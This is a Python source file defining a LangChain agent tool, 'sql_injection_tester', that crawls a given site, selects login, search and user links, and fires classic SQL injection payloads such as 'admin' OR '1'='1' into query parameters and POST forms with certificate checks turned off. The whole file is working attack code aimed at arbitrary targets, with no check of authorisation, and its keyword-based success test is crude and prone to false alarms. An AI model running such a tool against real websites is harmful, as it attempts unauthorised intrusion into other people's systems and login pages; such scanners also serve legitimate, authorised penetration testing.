import httpx
from langchain_core.tools import tool
from backend_v2.tools.recon_helper import fetch_html, extract_forms, extract_links, normalize_url
from urllib.parse import parse_qsl, urlparse


@tool
def sql_injection_tester(target: str) -> str:
    """Performs generic SQL injection checks against query params and form inputs."""
    try:
        target_url = normalize_url(target)
        text = fetch_html(target_url)
        links = extract_links(text, target_url)
        candidates = [target_url] + [link for link in links if any(token in link.lower() for token in ["login", "auth", "signin", "search", "user", "id"])][:5]

        payloads = ["admin' OR '1'='1", "' OR 1=1--", "' OR '1'='1' --"]
        markers = ["success", "welcome", "dashboard", "logged in", "admin", "user profile"]

        for candidate in candidates:
            parsed = urlparse(candidate)
            if parsed.scheme not in {"http", "https"}:
                continue

            params = dict(parse_qsl(parsed.query, keep_blank_values=True))
            if params:
                for payload in payloads:
                    updated = {k: payload for k in params}
                    res = httpx.get(candidate, params=updated, timeout=8.0, follow_redirects=True, verify=False)
                    if any(marker in res.text.lower() for marker in markers):
                        return f"SQL INJECTION FOUND: query parameters may be injectable on {candidate} using payload {payload}"

            forms = extract_forms(fetch_html(candidate), candidate)
            for form in forms:
                if form["method"] == "post" and form["inputs"]:
                    data = {name: payloads[0] for name in form["inputs"]}
                    res = httpx.post(form["action"], data=data, timeout=8.0, follow_redirects=True, verify=False)
                    if any(marker in res.text.lower() for marker in markers):
                        return f"SQL INJECTION FOUND: form submission may be injectable at {form['action']}"

        return f"No SQL injection issues detected on {target_url}"
    except Exception as exc:
        return f"SQL injection tester error: {exc}"
